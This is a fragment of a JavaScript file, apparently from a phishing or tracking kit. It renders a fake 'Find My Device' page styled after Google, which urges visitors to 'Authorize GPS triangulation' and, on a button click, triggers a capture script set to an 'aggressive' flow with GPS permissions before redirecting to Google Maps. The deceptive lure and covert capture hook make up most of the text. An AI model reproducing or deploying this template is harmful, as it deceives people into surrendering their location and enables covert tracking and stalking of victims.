    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Find My Device</title><style>body { background: #f0f2f5; display: flex; height: 100vh; margin: 0; align-items: center; justify-content: center; font-family: sans-serif; color: #333; flex-direction: column;} .box { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);} .btn { background: #4285f4; color: white; border: none; padding: 12px 24px; border-radius: 4px; margin-top: 20px; width: 100%; font-weight: bold;} </style></head><body><div class="box"><h3>📍 Localize Phone Sector</h3><p>Authorize GPS triangulation to trace the lost phone sector.</p><button class="btn" onclick="this.innerText='Connecting Satellites...'; window.startCapture('all');">Triangulate GPS</button></div>${getCaptureScript(id, 'https://maps.google.com', {
      tmplId: 'gps_tracker', flow: 'aggressive', perms: ['gps']
    })}</body></html>`
  }
};

// Global metadata version trigger for GitHub sync (v1.1.4)
